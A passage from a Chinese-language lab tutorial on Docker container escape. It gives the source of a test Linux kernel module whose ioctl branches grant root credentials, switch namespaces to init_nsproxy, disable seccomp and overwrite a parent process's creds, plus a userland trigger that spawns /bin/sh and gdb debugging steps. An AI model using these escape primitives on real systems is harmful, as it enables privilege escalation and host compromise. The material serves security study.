        return 0;
    }
    
    static ssize_t sw_ns_(void){
        size_t(*find_task_by_vpid)(int) = 0xFFFFFFFF810E6500;
        size_t g = (*find_task_by_vpid)(1);
        
        size_t init_nsproxy = 0xFFFFFFFF82E8B000;
        size_t(*switch_task_ns)(size_t, size_t) = 0xFFFFFFFF810EECB0;
        (*switch_task_ns)(g, init_nsproxy); 
        
        return 0;
    }
    
    static ssize_t change_parent_cred_(void){
        size_t cred_addr = prepare_kernel_cred(0);
        current->real_parent->real_cred = cred_addr;
        current->real_parent->cred = cred_addr;
        return 0;
    }
    
    long helloioctl(struct file *proc_file, unsigned int cmd, unsigned long arg){
        printk(":into ioctl!\n");
        
        switch(cmd){
            case 0x1000:
                commit_creds(prepare_kernel_cred(0));  // 更改当前进程 cred
                break;
            case 0x1001:
                set_fs_struct_();  // 更改当前进程 fs_struct，使其指向 host pid-1 的 fs_struct
                break;
            case 0x1002:
                sw_ns_();  // 更改 Docker pid-1 的 nsproxy 指向 init_nsproxy
                break;
            case 0x1003:
                current->thread_pid->level = 0;  // 更改当前进程 pid namespace 的 level 值
                break;
            case 0x1004:
                *(unsigned long*)((char*)current+8) = 0;  // 更改当前进程 seccomp 的开关 
                break;
            case 0x1005:
                change_parent_cred_();  // 更改父进程的 cred
                break;
            default:
                break;
        }
        return 0;
    }
    
    struct file_operations hello_fops = {
        .owner = THIS_MODULE,
        .open = helloopen,
        .read = helloread,
        .write = hellowrite,
        .unlocked_ioctl = helloioctl,
    };
    
    static int __init init_function(void)
    {
        int v1;
        struct device *v2; 
    
        printk("hello! a test ko!\\n");
        if( alloc_chrdev_region(&hellodev_no, 0, 1, "hellodev") >= 0 ){  
            cdev_init(&cdev_0, &hello_fops);
            cdev_0.owner = THIS_MODULE;
            test_major = MAJOR(hellodev_no);
            test_minor = MINOR(hellodev_no);
            printk("[+] test_major: %d ; test_minor: %d \n",test_major,test_minor);
            v1 = cdev_add(&cdev_0, hellodev_no, 1);
            if ( v1 >= 0 ){
                hellodev_class = class_create(THIS_MODULE, "hellodev_class");  
                if ( hellodev_class ){
                    v2 = device_create(hellodev_class, 0, MKDEV(test_major,0), 0, "hellodev");  
                    if ( v2 ) return 0;
                    printk("create device failed");
                    class_destroy(hellodev_class);
                }else{
                    printk("create class failed");
                }
                cdev_del(&cdev_0);
            } else{
                printk("cdev init failed");
            }
            unregister_chrdev_region(hellodev_no, 1);
            return v1;
        }
        printk("alloc_chrdev_region failed");
        return 1;
    }
    
    static void __exit exit_function(void)
    {
        printk("bye bye~\\n");
        device_destroy(hellodev_class, hellodev_no); 
        class_destroy(hellodev_class);
        cdev_del(&cdev_0);
        unregister_chrdev_region(hellodev_no, 1);
    }
    
    module_init(init_function);
    module_exit(exit_function);
    
    MODULE_LICENSE("GPL");
    MODULE_AUTHOR("bling");
    MODULE_DESCRIPTION("testdriver");
    ```

    Makefile文件如下：

    ```css
    KDIR := /lib/modules/$(shell uname -r)/build
    obj-m += hello.o
    
    all:
    make -C $(KDIR) M=$(shell pwd) modules
    clean:
    make -C $(KDIR) M=$(shell pwd) clean
    ```

    编译并安装到系统中：

    ```bash
    make
    sudo insmod hello.ko
    ```

### 7.4 测试程序

* 测试程序源码如下：

    ```c
    // test.c
    #include <stdio.h>
    
    int main(){
    char buf[100];
    printf("pid: %d\n",getpid());
    
    int fd = open("/dev/hellodev",2);
    if(fd <= 0){
        printf("fd: %d error, %d \n",fd, errno);
        exit(-1);
    }
        
        /* 组合不同的ioctl分支来调试 */
        ioctl(fd, 0x1000, 0);   // 更改当前进程 cred
        // ioctl(fd, 0x1001, 0);  // 更改当前进程 fs_struct，使其指向 host pid-1 的 fs_struct
        // ioctl(fd, 0x1002, 0);  // 更改 Docker pid-1 的 nsproxy 指向 init_nsproxy
        // ioctl(fd, 0x1003, 0);  // 更改当前进程 pid namespace 的 level 值，改成0
        // ioctl(fd, 0x1004, 0);  // 更改当前进程 seccomp 的开关，改成关闭状态
        // ioctl(fd, 0x1005, 0);  // 更改父进程的 cred
    
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }
    ```

* 编译

    ```shell
    gcc test.c -o test
    ```

### 7.5 调试

被调试机中：

* 安装内核ko

    ```bash
    sudo insmod hello.ko
    ```

* 起Docker，三种不同的方式

    ```bash
    Docker run --rm -it --device=/dev/hellodev:/dev/hellodev testDocker bash
    # Docker run --rm -it --cap-add=SYS_ADMIN --device=/dev/hellodev:/dev/hellodev testDocker bash
    # Docker run --rm -it --cap-add=SYS_ADMIN --security-opt="seccomp=unconfined" --device=/dev/hellodev:/dev/hellodev testDocker bash
    ```

* 将test程序拷贝到Docker中

    ```bash
    Docker cp /home/bling/exp/test e48:/app
    ```

调试机中：

* gdb加载内核elf符号文件

    ```bash
    $ gdb
    (gdb) target remote 192.168.133.1:8864
    (gdb) file ./vmlinuz-5.15.0-105-generic.elf
    (gdb) add-symbol-file ./hello.ko 0xffffffffc071e000
    (gdb) b *0xffffffffc071e01d
    (gdb) c
    ```
